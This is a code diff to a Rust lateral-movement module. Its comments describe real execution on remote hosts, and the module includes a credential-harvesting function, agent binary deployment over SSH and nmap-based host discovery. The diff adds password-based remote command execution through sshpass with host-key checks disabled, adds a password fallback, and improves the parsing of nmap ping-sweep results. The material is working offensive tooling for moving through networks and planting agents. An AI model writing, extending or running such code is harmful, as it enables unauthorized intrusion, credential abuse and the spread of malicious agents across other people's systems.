@@ -2,8 +2,9 @@
 // SSH with key-based auth, SCP binary deploy, network discovery via ARP/nmap.
 // No simulation. Commands execute on real remote hosts.
 
-use std::process::Command;
+use std::net::IpAddr;
 use std::path::PathBuf;
+use std::process::Command;
 use tracing::{info, warn};
 
 #[derive(Debug)]
@@ -94,7 +95,7 @@ pub fn harvest_credentials() -> Vec<(String, String, String)> {
 // ── SSH Remote Execution (REAL) ──────────────────────────────────────────────
 
 pub fn exec_ssh(host: &str, username: &str, command: &str,
-                key_path: Option<&str>, _password: Option<&str>) -> LateralResult {
+                key_path: Option<&str>, password: Option<&str>) -> LateralResult {
     // BRAIN: never attack safe targets
     let cfg = crate::config::HiveConfig::load();
     if crate::panal::is_safe_target(host, &cfg.brain) {
@@ -105,22 +106,71 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
             output: "BLOCKED by BRAIN: safe target".into(),
         };
     }
+
+    let start = std::time::Instant::now();
+    let output;
+
+    // Use password auth via sshpass when available
+    if let Some(pass) = password {
+        if !pass.is_empty() {
+            match Command::new("sshpass")
+                .args(["-p", pass, "ssh",
+                       "-o", "StrictHostKeyChecking=no",
+                       "-o", "UserKnownHostsFile=/dev/null",
+                       "-o", "ConnectTimeout=10",
+                       "-o", "LogLevel=ERROR",
+                       &format!("{}@{}", username, host),
+                       command])
+                .output()
+            {
+                Ok(out) => {
+                    output = out;
+                    let result = LateralResult {
+                        success: output.status.success(),
+                        technique: "ssh_exec_sshpass".into(),
+                        target: format!("{}@{}", username, host),
+                        output: format!(
+                            "[{}ms] stdout:{} stderr:{}",
+                            start.elapsed().as_millis(),
+                            String::from_utf8_lossy(&output.stdout).trim().chars().take(200).collect::<String>(),
+                            String::from_utf8_lossy(&output.stderr).trim().chars().take(100).collect::<String>(),
+                        ),
+                    };
+                    return result;
+                }
+                Err(e) => {
+                    return LateralResult {
+                        success: false,
+                        technique: "ssh_exec".into(),
+                        target: format!("{}@{}", username, host),
+                        output: format!("sshpass error: {}", e),
+                    };
+                }
+            }
+        }
+    }
+
+    // Key-based or no-auth fallback
     let mut cmd = Command::new("ssh");
     cmd.arg("-o").arg("StrictHostKeyChecking=no")
        .arg("-o").arg("UserKnownHostsFile=/dev/null")
        .arg("-o").arg("ConnectTimeout=10")
-       .arg("-o").arg("PasswordAuthentication=no")
-       .arg("-o").arg("BatchMode=yes")
        .arg("-o").arg("LogLevel=ERROR");
 
-    if let Some(key) = key_path {
-        cmd.arg("-i").arg(key);
+    if key_path.is_some() {
+        cmd.arg("-o").arg("BatchMode=yes")
+           .arg("-o").arg("PasswordAuthentication=no");
+        if let Some(key) = key_path {
+            cmd.arg("-i").arg(key);
+        }
+    } else {
+        cmd.arg("-o").arg("PasswordAuthentication=yes")
+           .arg("-o").arg("PreferredAuthentications=keyboard-interactive,password");
     }
 
     cmd.arg(format!("{}@{}", username, host))
        .arg(command);
 
-    let start = std::time::Instant::now();
     match cmd.output() {
         Ok(out) => LateralResult {
             success: out.status.success(),
@@ -169,7 +219,7 @@ pub fn deploy_agent_ssh(host: &str, username: &str, agent_binary: &[u8],
 pub fn discover_hosts(subnet: &str) -> Vec<String> {
     let mut hosts = Vec::new();
 
-    // Try nmap ping sweep
+    // Try nmap ping sweep then port 22 filter
     if let Ok(out) = Command::new("nmap")
         .args(["-sn", "-T4", "--max-retries", "1", subnet])
         .output()
@@ -177,14 +227,21 @@ pub fn discover_hosts(subnet: &str) -> Vec<String> {
         let text = String::from_utf8_lossy(&out.stdout);
         for line in text.lines() {
             if line.starts_with("Nmap scan report for") {
-                if let Some(ip) = line.split_whitespace().last() {
-                    if ip.parse::<std::net::IpAddr>().is_ok() {
-                        hosts.push(ip.to_string());
-                    }
+                let tokens: Vec<&str> = line.split_whitespace().collect();
+                let last = tokens.last().copied().unwrap_or("");
+                let ip_str = if last.starts_with('(') && last.ends_with(')') {
+                    &last[1..last.len()-1]
+                } else {
+                    last
+                };
+                if ip_str.parse::<IpAddr>().is_ok() {
+                    hosts.push(ip_str.to_string());
                 }
             }
         }
     }
+
+    info!("Discovered {} hosts on {}", hosts.len(), subnet);
 
     // Fallback: ARP cache
     if hosts.is_empty() {
